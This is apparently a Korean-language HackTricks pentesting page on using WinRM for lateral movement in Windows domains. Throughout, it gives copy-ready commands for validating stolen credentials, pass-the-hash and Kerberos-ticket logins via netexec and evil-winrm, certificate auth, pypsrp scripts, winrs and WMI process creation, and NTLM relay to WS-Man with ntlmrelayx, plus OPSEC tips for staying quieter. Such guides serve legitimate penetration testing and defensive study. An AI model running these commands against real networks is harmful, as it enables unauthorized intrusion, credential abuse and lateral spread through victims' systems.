# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM은 Windows 환경에서 가장 편리한 **lateral movement** 전송 방식 중 하나다. **WS-Man/HTTP(S)** 위로 원격 shell을 제공하므로 SMB service creation 트릭이 필요 없다. 대상이 **5985/5986**을 노출하고 있고, 현재 principal이 remoting 사용 권한을 가지고 있다면, “valid creds”에서 “interactive shell”까지 매우 빠르게 이동할 수 있다.

**protocol/service enumeration**, listeners, WinRM 활성화, `Invoke-Command`, 일반적인 client 사용법은 여기서 확인하라:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Why operators like WinRM

- **HTTP/HTTPS**를 사용하므로 SMB/RPC보다 더 자주 통한다. 그래서 PsExec-style execution이 막힌 환경에서도 동작하는 경우가 많다.
- **Kerberos**를 사용하면 재사용 가능한 credentials를 대상에게 전송하지 않는다.
- **Windows**, **Linux**, **Python** tooling(`winrs`, `evil-winrm`, `pypsrp`, `netexec`)에서 깔끔하게 동작한다.
- interactive PowerShell remoting 경로는 인증된 user context 아래에서 대상에 **`wsmprovhost.exe`**를 실행하며, 이는 service-based exec와 운영적으로 다르다.

## Access model and prerequisites

실제로 WinRM lateral movement가 성공하려면 다음 **3가지**가 필요하다.

1. 대상에 **WinRM listener**(`5985`/`5986`)와 접근을 허용하는 firewall rules가 있어야 한다.
2. 해당 account가 endpoint에 **authenticate**할 수 있어야 한다.
3. 해당 account가 remoting session을 **open**할 수 있어야 한다.

이 access를 얻는 흔한 방법:

- 대상에서 **Local Administrator**.
- 최신 시스템에서는 **Remote Management Users** 멤버십, 또는 해당 그룹을 아직 존중하는 시스템/구성 요소에서는 **WinRMRemoteWMIUsers__** 멤버십.
- local security descriptors / PowerShell remoting ACL 변경을 통해 위임된 explicit remoting rights.

이미 admin 권한이 있는 box를 제어하고 있다면, 여기서 설명한 기법을 사용해 **전체 admin group membership 없이도 WinRM access를 위임**할 수 있다는 점을 기억하라:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas that matter during lateral movement

- **Kerberos는 hostname/FQDN이 필요**하다. IP로 연결하면 client는 보통 **NTLM/Negotiate**로 fallback 한다.
- **workgroup** 또는 cross-trust edge case에서는 NTLM이 보통 **HTTPS**를 요구하거나, client의 **TrustedHosts**에 target을 추가해야 한다.
- workgroup에서 **local accounts**로 Negotiate를 사용할 때, UAC remote restrictions 때문에 built-in Administrator account를 사용하거나 `LocalAccountTokenFilterPolicy=1`이 아니면 access가 막힐 수 있다.
- PowerShell remoting은 기본적으로 **`HTTP/<host>` SPN**을 사용한다. 환경에서 이미 `HTTP/<host>`가 다른 service account에 등록되어 있으면, WinRM Kerberos가 `0x80090322`로 실패할 수 있다. 이 경우 port-qualified SPN을 사용하거나 해당 SPN이 존재하는 **`WSMAN/<host>`**로 전환하라.

password spraying 중 valid credentials를 얻었다면, WinRM으로 검증하는 것이 그것이 shell로 이어지는지 확인하는 가장 빠른 방법인 경우가 많다:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec for validation and one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### 인터랙티브 셸을 위한 Evil-WinRM

`evil-winrm`는 **passwords**, **NT hashes**, **Kerberos tickets**, **client certificates**, 파일 전송, 그리고 메모리 내 PowerShell/.NET 로딩을 지원하므로, Linux에서 가장 편리한 인터랙티브 옵션으로 남아 있다.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN edge case: `HTTP` vs `WSMAN`

기본 **`HTTP/<host>`** SPN이 Kerberos 실패를 일으키는 경우, 대신 **`WSMAN/<host>`** 티켓을 요청/사용해 보세요. 이는 **`HTTP/<host>`**가 이미 다른 서비스 계정에 연결된, 강화되었거나 특이한 기업 환경에서 나타납니다.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
이것은 특히 **RBCD / S4U** abuse 이후에도 유용한데, 이때 일반적인 `HTTP` ticket이 아니라 **WSMAN** service ticket을 직접 forged 하거나 requested 했을 때 그렇습니다.

### Certificate-based authentication

WinRM은 **client certificate authentication**도 지원하지만, certificate는 target에서 **local account**로 mapped되어 있어야 합니다. 공격 관점에서 이것이 중요한 경우는 다음과 같습니다:

- WinRM에 이미 mapped된 유효한 client certificate와 private key를 stolen/exported한 경우;
- **AD CS / Pass-the-Certificate**를 abuse하여 principal에 대한 certificate를 얻은 뒤 다른 authentication path로 pivot하는 경우;
- password-based remoting을 의도적으로 피하는 환경에서 operating하는 경우.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM은 password/hash/Kerberos auth보다 훨씬 덜 흔하지만, 존재할 경우 password rotation을 견디는 **passwordless lateral movement** 경로를 제공할 수 있습니다.

### Python / automation with `pypsrp`

operator shell 대신 automation이 필요하다면, `pypsrp`는 Python에서 **NTLM**, **certificate auth**, **Kerberos**, **CredSSP** 지원과 함께 WinRM/PSRP를 제공합니다.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
더 세밀한 제어가 필요하다면, 고수준 `Client` 래퍼보다 더 낮은 수준의 `WSMan` + `RunspacePool` API가 두 가지 흔한 operator 문제에 유용하다:

- 많은 PowerShell clients가 사용하는 기본 `HTTP` 기대값 대신 Kerberos service/SPN으로 **`WSMAN`**을 강제하기;
- `Microsoft.PowerShell` 대신 **JEA** / custom session configuration 같은 **non-default PSRP endpoint**에 연결하기.
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### Custom PSRP endpoints and JEA matter during lateral movement

성공적인 WinRM authentication이 항상 기본의 제한 없는 `Microsoft.PowerShell` endpoint로 연결된다는 뜻은 아닙니다. 성숙한 환경에서는 자체 ACL과 run-as 동작을 가진 **custom session configurations** 또는 **JEA** endpoint가 노출될 수 있습니다.

이미 Windows 호스트에서 code execution을 가지고 있고 어떤 remoting surface가 존재하는지 확인하고 싶다면, 등록된 endpoint를 열거하세요:
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
유용한 endpoint가 존재할 때는 기본 shell 대신 이를 명시적으로 target하라:
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
Practical offensive implications:

- **제한된** endpoint라도 서비스 제어, 파일 접근, 프로세스 생성, 또는 임의의 .NET / external command execution에 필요한 적절한 cmdlet/function만 노출한다면 lateral movement에 충분할 수 있다.
- **잘못 설정된 JEA** role은 `Start-Process`, 광범위한 와일드카드, writable providers, 또는 의도된 제한을 우회하게 해주는 custom proxy function 같은 위험한 명령을 노출할 때 특히 유용하다.
- **RunAs virtual accounts** 또는 **gMSAs**를 사용하는 endpoint는 실행한 명령의 실제 security context를 바꾼다. 특히 gMSA-backed endpoint는 일반적인 WinRM session이 classic delegation problem에 걸리더라도 **second hop에서 network identity**를 제공할 수 있다.

## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe`는 내장되어 있으며 interactive PowerShell remoting session을 열지 않고도 **native WinRM command execution**을 원할 때 유용하다:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
실무에서는 쉽게 잊기 쉬운 두 개의 플래그가 중요합니다:

- `/noprofile`은 원격 principal이 **로컬 administrator가 아닐 때** 자주 필요합니다.
- `/allowdelegate`는 원격 shell이 **세 번째 호스트**에 대해 당신의 credentials를 사용할 수 있게 합니다(예: command가 `\\fileserver\share`가 필요할 때).
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
운영상으로, `winrs.exe`는 일반적으로 다음과 유사한 원격 프로세스 체인을 생성한다:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
이것은 기억해둘 가치가 있습니다. 서비스 기반 exec 및 대화형 PSRP 세션과 다르기 때문입니다.

### PowerShell remoting 대신 `winrm.cmd` / WS-Man COM

`Enter-PSSession` 없이도 WS-Man 위에서 WMI 클래스를 호출하여 **WinRM transport**를 통해 실행할 수 있습니다. 이렇게 하면 transport는 WinRM으로 유지되지만, 원격 실행 primitive는 **WMI `Win32_Process.Create`**가 됩니다:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
그 접근 방식은 다음과 같은 경우에 유용합니다:

- PowerShell logging이 강하게 모니터링될 때.
- 일반적인 PS remoting workflow가 아니라 **WinRM transport**만 원할 때.
- **`WSMan.Automation`** COM object를 중심으로 custom tooling을 만들거나 사용할 때.

## NTLM relay to WinRM (WS-Man)

SMB relay가 signing에 의해 차단되고 LDAP relay가 제한될 때, **WS-Man/WinRM**은 여전히 매력적인 relay 대상이 될 수 있습니다. 최신 `ntlmrelayx.py`에는 **WinRM relay servers**가 포함되어 있으며, **`wsman://`** 또는 **`winrms://`** targets로 relay할 수 있습니다.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
두 가지 실용적인 참고 사항:

- Relay는 대상이 **NTLM**을 허용하고, relayed principal이 WinRM을 사용할 수 있을 때 가장 유용하다.
- 최신 Impacket 코드는 **`WSMANIDENTIFY: unauthenticated`** 요청을 특별히 처리하므로, `Test-WSMan` 스타일의 probe가 relay 흐름을 깨지 않는다.

첫 번째 WinRM 세션에 들어간 뒤의 multi-hop 제약은 다음을 확인하라:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC 및 탐지 참고 사항

- **Interactive PowerShell remoting**은 보통 대상에서 **`wsmprovhost.exe`**를 생성한다.
- **`winrs.exe`**는 일반적으로 **`winrshost.exe`**를 생성한 다음 요청된 child process를 실행한다.
- Custom **JEA** endpoint는 동작을 **`WinRM_VA_*`** virtual accounts 또는 설정된 **gMSA**로 실행할 수 있으며, 이는 일반 사용자 컨텍스트 shell과 비교해 telemetry와 second-hop 동작을 모두 바꾼다.
- PSRP를 raw `cmd.exe` 대신 사용하면 **network logon** telemetry, WinRM service events, 그리고 PowerShell operational/script-block logging이 발생할 것으로 예상하라.
- 단일 명령만 필요하다면, `winrs.exe` 또는 one-shot WinRM execution이 장시간 interactive remoting session보다 더 조용할 수 있다.
- Kerberos를 사용할 수 있다면, IP + NTLM보다 **FQDN + Kerberos**를 우선 사용해 trust issue와 클라이언트 측 `TrustedHosts` 변경을 줄여라.

## References

- [Microsoft: JEA Security Considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [pypsrp README](https://github.com/jborean93/pypsrp)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
